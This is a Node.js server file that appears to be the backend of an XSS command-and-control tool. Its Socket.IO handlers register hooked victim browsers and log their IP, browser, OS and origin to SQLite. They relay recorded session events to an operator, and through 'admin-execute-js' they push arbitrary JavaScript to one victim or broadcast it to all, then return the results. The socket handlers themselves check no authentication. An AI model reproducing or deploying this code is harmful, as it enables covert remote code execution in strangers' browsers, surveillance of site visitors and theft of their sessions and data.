const express = require('express');
const https = require('https');
const fs = require('fs');
const { Server } = require('socket.io');
const session = require('express-session');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const bcrypt = require('bcrypt');
const crypto = require('crypto');
const cors = require('cors');

const app = express();

app.use(cors({ origin: '*', methods: ['GET', 'POST'], credentials: true }));

const sslOptions = {
    key: fs.readFileSync('/usr/src/app/certs/server.key'),
    cert: fs.readFileSync('/usr/src/app/certs/server.crt')
};

const server = https.createServer(sslOptions, app);

const io = new Server(server, { 
    cors: { origin: '*', methods: ["GET", "POST"], credentials: true },
    allowEIO3: true
});

const db = new sqlite3.Database('./data/support.db', (err) => {
    if (err) console.error('[DB] Connection error:', err.message);
    else console.log('[DB] Connected to SQLite database.');
});

db.serialize(() => {
    // Admins table
    db.run(`CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password_hash TEXT
    )`);

    // NEW: Connection History table
    db.run(`CREATE TABLE IF NOT EXISTS history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        socket_id TEXT,
        ip_address TEXT,
        browser TEXT,
        os TEXT,
        origin TEXT,
        connected_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    db.get(`SELECT * FROM users WHERE username = 'admin'`, async (err, row) => {
        if (!row) {
            const rawPassword = crypto.randomBytes(24).toString('hex');
            const salt = await bcrypt.genSalt(10);
            const hash = await bcrypt.hash(rawPassword, salt);
            db.run(`INSERT INTO users (username, password_hash) VALUES (?, ?)`, ['admin', hash], (insertErr) => {
                if (!insertErr) {
                    console.log('\n======================================================');
                    console.log('🚨 SYSTEM INITIALIZATION 🚨');
                    console.log('Admin account created successfully.');
                    console.log(`USERNAME: admin`);
                    console.log(`PASSWORD: ${rawPassword}`);
                    console.log('Save this password! It will not be shown again.');
                    console.log('======================================================\n');
                }
            });
        }
    });
});

const sessionSecret =
    process.env.SESSION_SECRET || crypto.randomBytes(64).toString('hex');

if (!process.env.SESSION_SECRET) {
    console.warn('[AUTH] SESSION_SECRET is not configured. Sessions will reset after restart.');
}

app.use(session({
    name: 'toxssicity.sid',
    secret: sessionSecret,
    resave: false,
    saveUninitialized: false,
    rolling: true,
    cookie: {
        secure: true,
        httpOnly: true,
        sameSite: 'lax',
        maxAge: 8 * 60 * 60 * 1000
    }
}));

app.use(express.urlencoded({ extended: false, limit: '10kb' }));
app.use(express.json({ limit: '10kb' }));


const publicDir = path.join(__dirname, 'public');
const loginPage = path.join(publicDir, 'index.html');
const notFoundPage = path.join(publicDir, '404.html');

// Used to keep the password-check timing more consistent
// when a username does not exist.
const DUMMY_PASSWORD_HASH = bcrypt.hashSync(
    crypto.randomBytes(32).toString('hex'),
    10
);

// LOGIN PAGE
// Authenticated users go straight to the operator page.
app.get(['/', '/login', '/index.html'], (req, res) => {
    if (req.session && req.session.isAuthenticated) {
        return res.redirect('/operator');
    }

    res.sendFile(loginPage);
});

// LOGIN POST
app.post('/login', (req, res) => {
    const username =
        typeof req.body.username === 'string'
            ? req.body.username.trim()
            : '';

    const password =
        typeof req.body.password === 'string'
            ? req.body.password
            : '';

    if (!username || !password || username.length > 128 || password.length > 1024) {
        return res.redirect(303, '/login?error=invalid');
    }

    db.get(
        'SELECT * FROM users WHERE username = ?',
        [username],
        async (err, user) => {
            if (err) {
                console.error('[AUTH] Database error:', err.message);
                return res.redirect(303, '/login?error=server');
            }

            try {
                const hashToCheck = user
                    ? user.password_hash
                    : DUMMY_PASSWORD_HASH;

                const passwordMatches = await bcrypt.compare(
                    password,
                    hashToCheck
                );

                if (!user || !passwordMatches) {
                    return res.redirect(303, '/login?error=invalid');
                }

                // Regenerate the session after successful authentication.
                req.session.regenerate((sessionErr) => {
                    if (sessionErr) {
                        console.error('[AUTH] Session error:', sessionErr);
                        return res.redirect(303, '/login?error=server');
                    }

                    req.session.isAuthenticated = true;

                    req.session.save((saveErr) => {
                        if (saveErr) {
                            console.error('[AUTH] Session save error:', saveErr);
                            return res.redirect(303, '/login?error=server');
                        }

                        return res.redirect('/operator');
                    });
                });

            } catch (error) {
                console.error('[AUTH] Login error:', error);
                return res.redirect(303, '/login?error=server');
            }
        }
    );
});

// AUTHENTICATION MIDDLEWARE
function requireAuth(req, res, next) {
    if (req.session && req.session.isAuthenticated) {
        res.setHeader(
            'Cache-Control',
            'no-cache, private, no-store, must-revalidate'
        );
        res.setHeader('Pragma', 'no-cache');
        res.setHeader('Expires', '0');

        return next();
    }

    return res.redirect('/login');
}

// LOGOUT
app.get('/logout', (req, res) => {
    req.session.destroy((err) => {
        if (err) {
            console.error('[AUTH] Error destroying session:', err);
            return res.status(500).send('Error logging out.');
        }

        res.clearCookie('toxssicity.sid', {
            path: '/',
            secure: true,
            httpOnly: true,
            sameSite: 'lax'
        });

        return res.redirect('/?logout=1');
    });
});

// PROTECTED OPERATOR PAGE
app.get('/operator', requireAuth, (req, res) => {
    res.sendFile(
        path.join(__dirname, 'private', 'operator.html')
    );
});

// STATIC PUBLIC FILES
app.use(express.static(publicDir));

// CUSTOM 404 PAGE
app.use((req, res) => {
    res.status(404).sendFile(notFoundPage, (err) => {
        if (err && !res.headersSent) {
            res.status(404).send('404 - Page Not Found');
        }
    });
});

// GENERAL ERROR HANDLER
app.use((err, req, res, next) => {
    console.error('[HTTP] Unexpected error:', err);

    if (res.headersSent) {
        return next(err);
    }

    res.status(500).send('Internal Server Error');
});

// --- MULTI-USER STREAM RELAY ---
const activeClients = new Map();

io.on('connection', (socket) => {
    console.log(`[SYS] Clean connection pipeline opened: ${socket.id}`);

    socket.on('register-admin', () => {
        socket.join('admin_room');
        socket.emit('active-clients-list', Array.from(activeClients.values()));
    });

    socket.on('register-specs', (metadata) => {
        const clientData = { id: socket.id, browser: metadata.browser, os: metadata.os, origin: metadata.origin };
        activeClients.set(socket.id, clientData);
        socket.join(`room_${socket.id}`);
        io.to('admin_room').emit('active-clients-list', Array.from(activeClients.values()));

        // NEW: Log this connection to the database
        // We check 'x-forwarded-for' in case you are behind a reverse proxy or Docker
        const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
        db.run(`INSERT INTO history (socket_id, ip_address, browser, os, origin) VALUES (?, ?, ?, ?, ?)`, 
            [socket.id, ip, metadata.browser, metadata.os, metadata.origin]
        );
    });

    socket.on('watch-client', (targetClientId) => {
        if (socket.currentWatchingRoom) socket.leave(socket.currentWatchingRoom);
        const newRoom = `room_${targetClientId}`;
        socket.join(newRoom);
        socket.currentWatchingRoom = newRoom;
        io.to(targetClientId).emit('request-snapshot');
    });

    socket.on('record-event', (event) => socket.to(`room_${socket.id}`).emit('replay-event', event));
    socket.on('request-control', (targetClientId) => io.to(targetClientId).emit('control-requested'));
    socket.on('operator-action', (data) => io.to(data.targetClientId).emit('execute-action', data));
    socket.on('control-approved', () => socket.to(`room_${socket.id}`).emit('control-approved'));
    socket.on('control-denied', () => socket.to(`room_${socket.id}`).emit('control-denied'));


    socket.on('admin-execute-js', (data) => {
        // data contains: { targetClientId, code }
        if (data.targetClientId === 'all') {
            socket.broadcast.emit('execute-js', data.code);
        } else {
            io.to(data.targetClientId).emit('execute-js', data.code);
        }
    });

    socket.on('client-js-result', (resultData) => {
        // Pass the result from the target browser back to the Admin room
        io.to('admin_room').emit('admin-js-result', resultData);
    });

    // ... socket.on('disconnect', ...) ...

    // NEW: Fetch history for the admin panel
    socket.on('request-history', () => {
        // Fetch the 100 most recent connections
        db.all(`SELECT * FROM history ORDER BY connected_at DESC LIMIT 100`, [], (err, rows) => {
            if (!err) socket.emit('history-data', rows);
        });
    });

    socket.on('disconnect', () => {
        if (activeClients.has(socket.id)) {
            activeClients.delete(socket.id);
            io.to('admin_room').emit('active-clients-list', Array.from(activeClients.values()));
        }
    });
});

const PORT = 8443;
server.listen(PORT, '0.0.0.0', () => console.log(`[SYS] Relay active at 0.0.0.0:${PORT}`));
